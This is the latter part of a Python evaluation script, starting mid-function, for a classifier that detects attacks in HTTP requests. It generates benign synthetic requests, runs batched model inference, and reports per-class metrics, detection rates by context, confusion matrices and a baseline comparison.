        "search=programming+books&category=technology&sort=relevance",
        "comment=Great+article%2C+thanks+for+sharing%21&rating=5",
        "to=ops%40example.com&cc=&subject=Server+maintenance&body=Please+restart+nginx",
    ])
    return dict(
        method="POST", path=env["path"],
        headers={
            "Host": env["host"], "User-Agent": env["ua"],
            "Content-Type": "application/x-www-form-urlencoded",
        },
        body=body, gold="normal", context="form_normal",
    )


def gen_normals(rng: random.Random, n: int) -> List[dict]:
    out = []
    # Distribution: 40% search (hard-neg), 35% browsing, 15% api, 10% form
    for _ in range(int(n * 0.40)):
        out.append(gen_normal_search(rng))
    for _ in range(int(n * 0.35)):
        out.append(gen_normal_browsing(rng))
    for _ in range(int(n * 0.15)):
        out.append(gen_normal_api(rng))
    for _ in range(int(n * 0.10)):
        out.append(gen_normal_form(rng))
    # Pad to exact n
    while len(out) < n:
        out.append(gen_normal_browsing(rng))
    return out[:n]


# --------------------------------------------------------------------------- #
# Eval                                                                         #
# --------------------------------------------------------------------------- #
def load_labels(model_dir: str) -> List[str]:
    for fname in ("label_config.json", "config.json"):
        p = os.path.join(model_dir, fname)
        if os.path.exists(p):
            with open(p) as f:
                blob = json.load(f)
            id2 = blob.get("id2label")
            if id2:
                return [v for _, v in sorted(((int(k), v) for k, v in id2.items()))]
    raise SystemExit(f"no id2label in {model_dir}")


def sample_to_text(s: dict) -> str:
    h = {k: v for k, v in (s["headers"] or {}).items() if v}
    return compose(s["method"], s["path"], h, s["body"])


def predict_all(model, tokenizer, texts, device, batch_size=32):
    out = []
    for i in range(0, len(texts), batch_size):
        chunk = texts[i:i + batch_size]
        enc = tokenizer(chunk, truncation=True, max_length=256, padding=True,
                        return_tensors="pt", return_token_type_ids=False).to(device)
        with torch.no_grad():
            logits = model(**enc).logits
            probs = torch.softmax(logits, dim=-1).cpu().tolist()
        out.extend(probs)
    return out


def run_model(model_dir, samples, device, batch_size=32):
    print(f"  [load] {model_dir}")
    labels = load_labels(model_dir)
    tok = AutoTokenizer.from_pretrained(model_dir)
    mdl = AutoModelForSequenceClassification.from_pretrained(model_dir).to(device).eval()
    t0 = time.time()
    texts = [sample_to_text(s) for s in samples]
    probs = predict_all(mdl, tok, texts, device, batch_size)
    dt = time.time() - t0
    preds = []
    for p in probs:
        ix = int(max(range(len(p)), key=lambda i: p[i]))
        preds.append({"label": labels[ix], "conf": float(p[ix]), "scores": p})
    print(f"  [infer] {len(samples)} samples in {dt:.1f}s ({1000*dt/len(samples):.1f} ms/sample)")
    return labels, preds


# --------------------------------------------------------------------------- #
# Reporting                                                                    #
# --------------------------------------------------------------------------- #
def summarize(samples, preds, labels, tag) -> dict:
    n = len(samples)
    correct = 0
    tp = defaultdict(int); fp = defaultdict(int); fn = defaultdict(int); sup = defaultdict(int)
    binary_tp = binary_tn = binary_fp = binary_fn = 0
    # Per-context survival.
    ctx_total = defaultdict(int); ctx_caught = defaultdict(int); ctx_correct = defaultdict(int)
    # Confusion matrix.
    classes = sorted(set([s["gold"] for s in samples]) | set([p["label"] for p in preds]))
    confusion = {g: {p: 0 for p in classes} for g in classes}

    for s, p in zip(samples, preds):
        gold = s["gold"]; pred = p["label"]
        sup[gold] += 1
        confusion[gold][pred] += 1
        if gold == pred:
            tp[gold] += 1; correct += 1
        else:
            fp[pred] += 1; fn[gold] += 1
        # Binary attack vs normal
        g_atk = gold != "normal"; p_atk = pred != "normal"
        if g_atk and p_atk: binary_tp += 1
        elif not g_atk and not p_atk: binary_tn += 1
        elif not g_atk and p_atk: binary_fp += 1
        else: binary_fn += 1
        # Per context (only for attacks)
        if g_atk:
            ctx = s.get("context", "?")
            ctx_total[ctx] += 1
            if p_atk: ctx_caught[ctx] += 1
            if gold == pred: ctx_correct[ctx] += 1

    per_class = {}
    for c in classes:
        pr = tp[c] / (tp[c] + fp[c]) if (tp[c] + fp[c]) else 0.0
        rc = tp[c] / (tp[c] + fn[c]) if (tp[c] + fn[c]) else 0.0
        f1 = 2 * pr * rc / (pr + rc) if (pr + rc) else 0.0
        per_class[c] = dict(support=sup[c], precision=pr, recall=rc, f1=f1)

    bin_pr = binary_tp / (binary_tp + binary_fp) if (binary_tp + binary_fp) else 0
    bin_rc = binary_tp / (binary_tp + binary_fn) if (binary_tp + binary_fn) else 0

    return {
        "tag": tag,
        "n": n,
        "accuracy": correct / n,
        "per_class": per_class,
        "binary": {"tp": binary_tp, "tn": binary_tn, "fp": binary_fp, "fn": binary_fn,
                   "precision": bin_pr, "recall": bin_rc},
        "per_context": {c: {"total": ctx_total[c], "caught": ctx_caught[c],
                            "correct_class": ctx_correct[c]} for c in ctx_total},
        "confusion": confusion,
        "classes": classes,
    }


def print_summary(s):
    print(f"\n{'='*72}\n{s['tag']}   N={s['n']}\n{'='*72}")
    print(f"Overall accuracy:  {s['accuracy']:.4f}")
    print(f"Binary attack precision={s['binary']['precision']:.4f}  recall={s['binary']['recall']:.4f}  "
          f"(TP={s['binary']['tp']} TN={s['binary']['tn']} FP={s['binary']['fp']} FN={s['binary']['fn']})")
    print("\nPER-CLASS")
    print(f"{'class':<16}{'support':>9}{'precision':>11}{'recall':>9}{'F1':>8}")
    macro_p = macro_r = macro_f = 0; nc = 0
    for c, m in sorted(s["per_class"].items()):
        print(f"{c:<16}{m['support']:>9d}{m['precision']:>11.3f}{m['recall']:>9.3f}{m['f1']:>8.3f}")
        macro_p += m["precision"]; macro_r += m["recall"]; macro_f += m["f1"]; nc += 1
    if nc:
        print(f"{'macro avg':<16}{s['n']:>9d}{macro_p/nc:>11.3f}{macro_r/nc:>9.3f}{macro_f/nc:>8.3f}")

    print("\nPER-CONTEXT (attacks only)")
    print(f"{'context':<14}{'total':>8}{'caught_atk':>13}{'correct_class':>16}{'survival %':>13}")
    for c, d in sorted(s["per_context"].items()):
        srv = 100 * d["caught"] / d["total"] if d["total"] else 0
        cls = 100 * d["correct_class"] / d["total"] if d["total"] else 0
        print(f"{c:<14}{d['total']:>8d}{d['caught']:>13d}{d['correct_class']:>16d}{srv:>11.1f} % / {cls:.1f} %")

    print("\nCONFUSION MATRIX  (rows=gold, cols=pred)")
    classes = s["classes"]
    print("{:<16}".format("") + "".join("{:>10}".format(c[:9]) for c in classes))
    for g in classes:
        row = "{:<16}".format(g)
        for p in classes:
            row += "{:>10d}".format(s["confusion"][g][p])
        print(row)


def print_compare(s_main, s_base):
    print(f"\n{'='*72}\nCOMPARISON  {s_base['tag']}  vs  {s_main['tag']}\n{'='*72}")
    print(f"{'metric':<24}{s_base['tag'][:20]:>22}{s_main['tag'][:20]:>22}{'Δ':>10}")
    print(f"{'overall accuracy':<24}{s_base['accuracy']:>22.4f}{s_main['accuracy']:>22.4f}"
          f"{(s_main['accuracy']-s_base['accuracy']):>+10.4f}")
    print(f"{'binary precision':<24}{s_base['binary']['precision']:>22.4f}{s_main['binary']['precision']:>22.4f}"
          f"{(s_main['binary']['precision']-s_base['binary']['precision']):>+10.4f}")
    print(f"{'binary recall':<24}{s_base['binary']['recall']:>22.4f}{s_main['binary']['recall']:>22.4f}"
          f"{(s_main['binary']['recall']-s_base['binary']['recall']):>+10.4f}")
    print("\nPer-class F1 comparison")
    print(f"{'class':<16}{'support':>9}{s_base['tag'][:14]:>16}{s_main['tag'][:14]:>16}{'Δ':>10}")
    for c in sorted(s_main["per_class"]):
        base_f1 = s_base["per_class"].get(c, {}).get("f1", 0)
        main_f1 = s_main["per_class"][c]["f1"]
        delta = main_f1 - base_f1
        flag = "🔺" if delta > 0.02 else ("🔻" if delta < -0.02 else "  ")
        print(f"{c:<16}{s_main['per_class'][c]['support']:>9d}{base_f1:>16.3f}{main_f1:>16.3f}"
              f"{delta:>+10.3f} {flag}")


# --------------------------------------------------------------------------- #
# Main                                                                         #
# --------------------------------------------------------------------------- #
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--model", required=True)
    ap.add_argument("--baseline", help="optional v5 dir for comparison")
    ap.add_argument("--out", help="output JSON summary file")
    ap.add_argument("--samples-per-class", type=int, default=500,
                    help="number of synthetic samples per attack class")
    ap.add_argument("--normal-count", type=int, default=2500)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--batch-size", type=int, default=32)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    device = "cuda" if torch.cuda.is_available() else "cpu"
    print(f"[device] {device}  seed={args.seed}")

    # Generate large-scale sample set.
    print("[gen] building synthetic test set...")
    attacks = gen_attacks(rng, args.samples_per_class)
    normals = gen_normals(rng, args.normal_count)
    samples = attacks + normals
    rng.shuffle(samples)
    print(f"[gen] {len(samples)} total  ({len(attacks)} attacks + {len(normals)} normals)")
    # Print distribution.
    dist = defaultdict(int)
    for s in samples:
        dist[s["gold"]] += 1
    print("[gen] class distribution:")
    for k, v in sorted(dist.items()):
        print(f"        {k:<16} {v:>6d}")

    # Eval main model.
    print(f"\n[eval] main = {args.model}")
    labels_main, preds_main = run_model(args.model, samples, device, args.batch_size)
    name_main = os.path.basename(args.model.rstrip("/"))
    s_main = summarize(samples, preds_main, labels_main, name_main)
    print_summary(s_main)

    s_base = None
    if args.baseline:
        print(f"\n[eval] baseline = {args.baseline}")
        labels_base, preds_base = run_model(args.baseline, samples, device, args.batch_size)
        name_base = os.path.basename(args.baseline.rstrip("/"))
        s_base = summarize(samples, preds_base, labels_base, name_base)
        print_summary(s_base)
        print_compare(s_main, s_base)

    if args.out:
        os.makedirs(os.path.dirname(args.out), exist_ok=True)
        with open(args.out, "w") as f:
            json.dump({"main": s_main, "baseline": s_base,
                       "config": vars(args)}, f, indent=2, default=str)
        print(f"\n[out] wrote summary → {args.out}")


if __name__ == "__main__":
    main()
